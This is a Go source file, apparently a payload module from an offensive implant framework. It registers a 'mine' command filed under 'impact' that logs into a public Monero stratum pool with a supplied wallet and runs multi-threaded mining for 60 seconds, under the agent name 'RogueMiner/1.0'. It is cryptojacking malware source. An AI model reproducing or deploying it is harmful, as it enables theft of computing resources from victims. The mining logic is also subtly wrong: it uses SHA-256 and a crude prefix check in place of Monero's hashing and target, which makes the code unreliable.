package payloads

import (
	"bufio"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"net"
	"strings"
	"sync"
	"time"
)

func init() {
	Register(&Miner{})
}

type Miner struct{}

func (m *Miner) Name() string        { return "mine" }
func (m *Miner) Category() string    { return "impact" }
func (m *Miner) Description() string { return "Monero (XMR) miner connecting to a stratum pool" }

func (m *Miner) Execute(args map[string]string) ([]byte, error) {
	wallet := args["wallet"]
	if wallet == "" {
		wallet = "YOUR_MONERO_WALLET_ADDRESS"
	}
	pool := args["pool"]
	if pool == "" {
		pool = "pool.supportxmr.com"
	}
	portStr := args["port"]
	port := 3333
	fmt.Sscanf(portStr, "%d", &port)
	threadsStr := args["threads"]
	threads := 2
	fmt.Sscanf(threadsStr, "%d", &threads)

	result := m.mine(wallet, pool, port, threads)
	return MarshalJSON(result)
}

type mineResult struct {
	Timestamp string `json:"timestamp"`
	Wallet    string `json:"wallet"`
	Pool      string `json:"pool"`
	Threads   int    `json:"threads"`
	HashCount int64  `json:"hash_count"`
	Shares    int    `json:"shares"`
	Duration  string `json:"duration"`
}

type stratumJob struct {
	JobID  string `json:"job_id"`
	Blob   string `json:"blob"`
	Target string `json:"target"`
}

func (m *Miner) mine(wallet, pool string, port, threads int) *mineResult {
	r := &mineResult{
		Timestamp: time.Now().UTC().Format(time.RFC3339),
		Wallet:    wallet,
		Pool:      pool,
		Threads:   threads,
	}

	addr := net.JoinHostPort(pool, fmt.Sprintf("%d", port))
	conn, err := net.DialTimeout("tcp", addr, 10*time.Second)
	if err != nil {
		return r
	}
	defer conn.Close()

	// Login
	login := map[string]interface{}{
		"id":     "0",
		"method": "login",
		"params": map[string]interface{}{
			"login": wallet,
			"pass":  "x",
			"agent": "RogueMiner/1.0",
		},
	}
	loginJSON, _ := json.Marshal(login)
	conn.Write(append(loginJSON, '\n'))

	// Read response
	reader := bufio.NewReader(conn)
	resp, _ := reader.ReadString('\n')

	var loginResp struct {
		Result struct {
			Job struct {
				JobID  string `json:"job_id"`
				Blob   string `json:"blob"`
				Target string `json:"target"`
			} `json:"job"`
		} `json:"result"`
	}
	json.Unmarshal([]byte(resp), &loginResp)

	job := loginResp.Result.Job
	if job.JobID == "" {
		r.Duration = "Login failed"
		return r
	}

	startTime := time.Now()
	var mu sync.Mutex
	var wg sync.WaitGroup

	for i := 0; i < threads; i++ {
		wg.Add(1)
		go func(workerID int) {
			defer wg.Done()
			localHash := int64(0)
			for time.Since(startTime) < 60*time.Second { // Run for 60 seconds
				// Simplified mining: hash the blob with a counter
				nonce := fmt.Sprintf("%016x", time.Now().UnixNano()%100000000+int64(workerID)*1000000)
				data := job.Blob[:78] + nonce + job.Blob[86:]
				hash := sha256.Sum256([]byte(data))
				_ = hash
				localHash++

				// Check if hash meets target (simplified)
				hashHex := hex.EncodeToString(hash[:])
				if strings.HasPrefix(hashHex, "0000") {
					// Submit share
					submit := map[string]interface{}{
						"id":     "0",
						"method": "submit",
						"params": map[string]interface{}{
							"id":     fmt.Sprintf("worker%d", workerID),
							"job_id": job.JobID,
							"nonce":  nonce,
							"result": hashHex,
						},
					}
					submitJSON, _ := json.Marshal(submit)
					conn.Write(append(submitJSON, '\n'))
					mu.Lock()
					r.Shares++
					mu.Unlock()
				}
			}
			mu.Lock()
			r.HashCount += localHash
			mu.Unlock()
		}(i)
	}

	wg.Wait()
	r.Duration = time.Since(startTime).Round(time.Second).String()

	return r
}
